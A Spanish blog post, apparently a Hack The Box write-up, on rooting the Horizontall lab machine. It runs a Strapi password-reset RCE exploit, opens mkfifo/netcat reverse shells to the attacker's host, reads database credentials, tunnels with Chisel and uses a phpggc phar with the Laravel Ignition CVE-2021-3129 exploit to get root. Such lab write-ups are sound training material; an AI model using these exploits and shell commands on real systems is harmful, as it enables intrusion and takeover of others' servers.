<!DOCTYPE html><html lang="es" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="días antes"><meta name="hour-prompt" content="horas antes"><meta name="minute-prompt" content="minutos antes"><meta name="justnow-prompt" content="justo ahora"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Horizontall (Hack The Box)" /><meta name="author" content="J0lm3d0" /><meta property="og:locale" content="es" /><meta name="description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina Horizontall de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma." /><meta property="og:description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina Horizontall de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma." /><link rel="canonical" href="https://j0lm3d0.github.io/posts/horizontall-(hack-the-box)/" /><meta property="og:url" content="https://j0lm3d0.github.io/posts/horizontall-(hack-the-box)/" /><meta property="og:site_name" content="J0lm3d0" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-05T20:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Horizontall (Hack The Box)" /><meta name="twitter:site" content="@J0lm3d0" /><meta name="twitter:creator" content="@J0lm3d0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J0lm3d0"},"dateModified":"2022-02-05T20:00:00+01:00","datePublished":"2022-02-05T20:00:00+01:00","description":"En este documento se recogen los pasos a seguir para la resolución de la máquina Horizontall de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.","headline":"Horizontall (Hack The Box)","mainEntityOfPage":{"@type":"WebPage","@id":"https://j0lm3d0.github.io/posts/horizontall-(hack-the-box)/"},"url":"https://j0lm3d0.github.io/posts/horizontall-(hack-the-box)/"}</script><title>Horizontall (Hack The Box) | J0lm3d0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="J0lm3d0"><meta name="application-name" content="J0lm3d0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="es"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://cdna.artstation.com/p/assets/images/images/022/342/774/large/nikita-poghainyi-viber-2019-08-04-15-41-05.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">J0lm3d0</a></div><div class="site-subtitle font-italic">CTF Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>HISTÓRICO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/J0lm3d0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/J0lm3d0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/j0lm3d0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Horizontall (Hack The Box)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Horizontall (Hack The Box)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> J0lm3d0 </span> - <span class="timeago " data-toggle="tooltip" data-placement="bottom" title=" 5 Feb 2022, 20:00" > 5 Feb<i class="unloaded">2022-02-05T20:00:00+01:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1906 palabras">10 minutos de lectura</span></div></div><div class="post-content"><p>En este documento se recogen los pasos a seguir para la resolución de la máquina Horizontall de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Horizontall/machine.png" alt="Logo de la máquina" /></p><p><a href="/pdfs/Write_up_Horizontall.pdf">Write-up en PDF realizado mediante LaTeX</a></p><h2 id="enumeración-de-servicios-y-recopilación-de-información-sensible">Enumeración de servicios y recopilación de información sensible</h2><p>Para comenzar, realizo un escaneo de todo el rango de puertos TCP mediante la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre># nmap -p- --open -T5 -n -vv 10.10.11.104

Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
</pre></table></code></div></div><p>Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre># nmap -p 22,80 -sC -sV 10.10.11.104

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>Gracias al script “http-title” de <em>Nmap</em> que muestra el título de la página web que devuelve el servidor al acceder a “http://10.10.11.104”, veo que no se ha podido redirigir al dominio “horizontall.htb”, por lo que parece que se está aplicando “Virtual Hosting”, que se trata de una técnica que permite tener una cantidad variable de dominios y sitios web en una misma máquina. Por tanto, añado este dominio al fichero “/etc/hosts” de mi máquina de atacante de la siguiente forma:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre># cat /etc/hosts

10.10.11.105    horizontall.htb
</pre></table></code></div></div><p>Tras haber añadido el dominio al fichero “/etc/hosts” accedo desde el navegador y veo la siguiente página:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Horizontall/mainpage.png" alt="Página principal del servidor web" /></p><p>La página continúa con más información si nos desplazamos hacia abajo, pero nada relevante que pueda ayudarnos, solo información sobre los servicios que ofrece “Horizontall”. También hay varios botones y el típico formulario de “Contáctanos”, pero nada es funcional. En el código fuente tampoco encuentro nada raro, por lo que procedo a buscar directorios y/o archivos mediante la herramienta <code class="language-plaintext highlighter-rouge">Gobuster</code>. Pero tampoco encuentro nada especial, el “index.html” que ya habíamos visto y tres directorios: “img”, “css” y “js”.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre># gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x php,txt,html -u http://horizontall.htb

/img                  (Status: 301) [Size: 194] [--&gt; http://horizontall.htb/img/]
/index.html           (Status: 200) [Size: 901]                                  
/css                  (Status: 301) [Size: 194] [--&gt; http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--&gt; http://horizontall.htb/js/]
</pre></table></code></div></div><p>Veo que los tres directorios muestran un código 301 y redirigen a otra ruta (es la misma, pero con el carácter “/” al final). Al acceder a la ruta a la que redirige cada uno de los directorios, me encuentro con que me devuelven un código 403 Forbidden, por lo que la capacidad de acceder a estas rutas se encuentra restringida.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Horizontall/forbidden.png" alt="Acceso restringido a los directorios &quot;img&quot;, &quot;css&quot; y &quot;js&quot; del servidor web" /></p><p>Aunque el acceso a estas rutas esté restringido, es posible que si se pueda acceder y ver los ficheros que las componen. Por ello, vuelvo a realizar una búsqueda de ficheros en las rutas descubiertas anteriormente, pero no descubro nada en ninguna de las búsqueda. Por tanto, al haber descubierto un dominio previamente, se me ocurre realizar una búsqueda de subdominios.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre># gobuster vhost -w subdomains-top1million-110000.txt -u horizontall.htb -t 80

Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
</pre></table></code></div></div><p>Gracias a <em>Gobuster</em>, descubro el subdominio “api-prod.horizontall.htb”. Tras esto, accedo a la página web, pero solo muestra un mensaje de bienvenida.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Horizontall/apiprodpage.png" alt="Página principal del subdominio &quot;api-prod.horizontall.htb&quot;" /></p><p>Por tanto, realizo de nuevo una búsqueda de directorios y ficheros ocultos en este subdominio descubierto.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb -t 80

/admin                (Status: 200) [Size: 854]
/users                (Status: 403) [Size: 60]
/reviews              (Status: 200) [Size: 507]
</pre></table></code></div></div><p>Como la ruta “users” nos devuelve un código 403 Forbidden, accedo a las rutas “reviews” y “admin” desde el navegador:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Horizontall/reviewspage.png" alt="Página &quot;reviews&quot; del subdominio encontrado" /></p><p><img data-proofer-ignore data-src="/assets/img/HTB/Horizontall/adminpage.png" alt="Página &quot;admin&quot; del subdominio encontrado" /></p><p>En la ruta “admin”, vemos un panel de inicio de sesión y un nombre: <strong>Strapi</strong>, que podría corresponder al nombre del gestor de contenidos (CMS) utilizado. Como no dispongo de ningunas credenciales, intento buscar algún exploit para este servicio que pueda aprovechar.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre># searchsploit Strapi

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                                                                       | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                                                                     | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                                               | multiple/webapps/50239.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</pre></table></code></div></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>No conozco la versión de Strapi que se está utilizando, pero decido probar el último exploit de la lista, que permite una ejecución remota de código sin necesidad de estar autenticado. Compruebo la funcionalidad del exploit y veo que se aprovecha de un error a la hora de realizar un cambio de contraseña para establecer una nueva contraseña (“SuperStrongPassword1” en este caso) en el usuario administrador y así conseguir una RCE ciega (no veremos la salida de los comandos que ejecutemos). Por tanto, me envio una shell a mi máquina de atacante mediante <code class="language-plaintext highlighter-rouge">NetCat</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre># python3 strapi_rce.py http://api-prod.horizontall.htb

[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM1MDA3MDMxLCJleHAiOjE2Mzc1OTkwMzF9.yF54Ajvxl1o6HhEKwx7uevlLCJNyEzQEZltPT6soDh8


$&gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.10.14.159 443 &gt;/tmp/f




#  nc -lvnp 443

listening on [any] 443 ...
connect to [10.10.14.159] from (UNKNOWN) [10.10.11.105] 44000
bash: cannot set terminal process group (1784): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$
</pre></table></code></div></div><p>El usuario mediante el que accedemos es “strapi”. Enumerando el sistema veo que existe el usuario “developer” y que la primera flag se encuentra en su directorio personal, aunque con los permisos de “strapi” puedo visualizarla.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>strapi@horizontall:~/myapi$ cat /etc/passwd | grep "sh$"

root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
strapi:x:1001:1001::/opt/strapi:/bin/sh
strapi@horizontall:~/myapi$ cat /home/developer/user.txt
</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>strapi@horizontall:/home/developer$ cat user.txt

0a4efbf88e27dbf4c7035536289baa9f
</pre></table></code></div></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Tras obtener la flag de usuario, me dispongo a enumerar el sistema en busca de alguna forma que me permita escalar privilegios para convertirme en el usuario “developer” o, directamente, en root. En una de las rutas del directorio personal de “strapi” (/opt/strapi) encuentro un fichero JSON con credenciales para una base de datos de MySQL que se encuentra en el servidor de la propia máquina.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>strapi@horizontall:~/myapi$ cat config/environments/development/database.json

{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
</pre></table></code></div></div><p>Pero, tras acceder a la base de datos, solo encuentro las credenciales del usuario “admin” de Strapi que había modificado previamente con el exploit utilizado. También intento utilizar la contraseña para migrarme al usuario “developer” mediante “su” y conectándome mediante el servicio SSH, pero no da resultado.</p><p>Por tanto, continuo enumerando la máquina (privilegios de “sudo”, binarios con bit SUID activado, capabilities…) y, al identificar los puertos por los que la máquina está escuchando peticiones, algo me llama la atención. Los puertos 22 y 80 son aquellos por los que está escuchando peticiones a través de cualquier interfaz de red y, por ello, coinciden con los que detecte en mi primer escaneo. Por otra parte, los puertos 1337, 3306 y 8000 están escuchando peticiones solo de forma local, es decir, de la propia máquina.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>strapi@horizontall:~/myapi$ netstat -natup | grep "LISTEN"

tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1859/node /usr/bin/
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
</pre></table></code></div></div><p>En el puerto 1337 se encuentra el servicio de <code class="language-plaintext highlighter-rouge">Node.js</code>, que se está encargando de procesar ciertas peticiones del servidor web; el 3306 es el servidor de MySQL que contiene la base de datos de Strapi a la que accedí anteriormente; y, del puerto 8000 no tengo ningún tipo de información. Entonces, para averiguar el contenido de este puerto, y al no contar con credenciales para conectarme por SSH, decido emplear la herramienta <code class="language-plaintext highlighter-rouge">Chisel</code> para realizar un <strong>port forwarding</strong> que redirija el tráfico del puerto 8000 de mi máquina de atacante al puerto 8000 de la máquina víctima, lo cual me permitirá comprobar el servicio que se está ejecutando en dicho puerto.</p><p>Para ello, hay que seguir los siguientes pasos:</p><ol><li>Transferir el ejecutable de Chisel a la máquina víctima.<li>Levantar un servidor de Chisel en la máquina ofensiva que escuche peticiones en un determinado puerto.<li>Ejecutar Chisel en la máquina víctima, especificando la IP y puerto del servidor y definiendo las reglas correspondientes al redireccionamiento de puertos que se quiere realizar.</ol><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre># chisel server -p 5001 --reverse

2021/10/31 18:48:16 server: Reverse tunnelling enabled
2021/10/31 18:48:16 server: Fingerprint IlFjG0RClS1yXjz7CNrb8tm0LgLeXFBblTuH/zgBgMk=
2021/10/31 18:48:16 server: Listening on http://0.0.0.0:5001
2021/10/31 18:48:19 server: session#1: tun: proxy#R:8000=&gt;localhost:8000: Listening

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

strapi@horizontall:/tmp$ ./chisel client 10.10.15.36:5001 R:8000:localhost:8000

2021/10/31 22:48:19 client: Connecting to ws://10.10.15.36:5001
2021/10/31 22:48:20 client: Connected (Latency 46.359648ms)

</pre></table></code></div></div><p>Una vez realizado el redireccionamiento, compruebo que el servicio que se ejecuta en el puerto 8000 se trata de un servicio HTTP. Por tanto, procedo a identificar su contenido a través del navegador. Tal y como se observa en la siguiente imagen, se está utilizando el framework <strong>Laravel</strong> (versión 8), que se utiliza para desarrollar aplicaciones web mediante PHP (versión 7.4.18):</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Horizontall/laravel.png" alt="Página principal del servicio HTTP ejecutado en el puerto 8000" /></p><p>Conociendo las versiones utilizadas de PHP y Laravel, busco exploits que puedan aplicar a través de <em>SearchSploit</em>, pero la búsqueda no es satisfactoria. Es por ello que decido también buscar en <code class="language-plaintext highlighter-rouge">GitHub</code>, donde encuentro el exploit que se muestra a continuación y que decido probar:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Horizontall/githubexploit.png" alt="Exploit para la vulnerabilidad CVE-2021-3129 de Laravel" /></p><p>Para utilizar este exploit hay que pasarle como argumentos la URL del servicio vulnerable y un archivo “.phar” que contenga las acciones que queremos aplicar. En el propio repositorio se explica como crear este archivo “.phar” utilizando php a través de interfaz de comandos. Solo se tendría que sustituir la parte final por el comando que queremos ejecutar en la máquina que contiene el servicio vulnerable, en mi caso enviará una shell mediante <em>Netcat</em> a mi máquina de atacante por el puerto 445.</p><p>Una vez creado el fichero “.phar”, ejecuto el exploit especificando la URL y el fichero creado y obtengo una conexión de la máquina víctima directamente como el usuario root, pudiendo así visualizar la flag final.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre># php -d'phar.readonly=0' phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.10.15.36 445 &gt;/tmp/f"

# python3 laravel-ignition-rce.py http://localhost:8000/ /tmp/exploit.phar

+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# nc -lvnp 445

listening on [any] 445 ...
connect to [10.10.15.36] from (UNKNOWN) [10.10.11.105] 41656
bash: cannot set terminal process group (40736): Inappropriate ioctl for device
bash: no job control in this shell

root@horizontall: cat /root/root.txt

869744a22986472334c66e788de16d86
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Horizontall (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/horizontall-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Horizontall (Hack The Box) - J0lm3d0&u=https://j0lm3d0.github.io/posts/horizontall-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Horizontall (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/horizontall-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', '¡Enlace copiado correctamente!')" data-toggle="tooltip" data-placement="top" title="Copiar enlace"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Actualizado recientemente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/tier-0-starting-point-machines-(hack-the-box)/">Tier 0 Starting Point Machines (Hack The Box)</a><li><a href="/posts/previse-(hack-the-box)/">Previse (Hack The Box)</a><li><a href="/posts/couch-(try-hack-me)/">Couch (Try Hack Me)</a><li><a href="/posts/knife-(hack-the-box)/">Knife (Hack The Box)</a><li><a href="/posts/pentesting_shells_cheat_sheet_script/">Pentesting_Shells-Cheat_Sheet-Script</a></ul></div><div id="access-tags"> <span>Etiquetas en tendencia</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contenidos</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Más entradas</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/couch-(try-hack-me)/"><div class="card-body"> <span class="timeago small" >12 Nov 2021<i class="unloaded">2021-11-12T11:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Couch (Try Hack Me)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Couch de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolu...</p></div></div></a></div><div class="card"> <a href="/posts/boilerctf-(try-hack-me)/"><div class="card-body"> <span class="timeago small" >25 Nov 2021<i class="unloaded">2021-11-25T19:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Boiler CTF (Try Hack Me)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Boiler CTF de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de r...</p></div></div></a></div><div class="card"> <a href="/posts/cap-(hack-the-box)/"><div class="card-body"> <span class="timeago small" > 2 Oct 2021<i class="unloaded">2021-10-02T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cap (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Cap de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resoluc...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/previse-(hack-the-box)/" class="btn btn-outline-primary" prompt="Anterior"><p>Previse (Hack The Box)</p></a> <a href="/posts/tier-1-starting-point-machines-(hack-the-box)/" class="btn btn-outline-primary" prompt="Siguiente"><p>Tier 1 Starting Point Machines (hack The Box)</p></a></div></div></div></div><footer 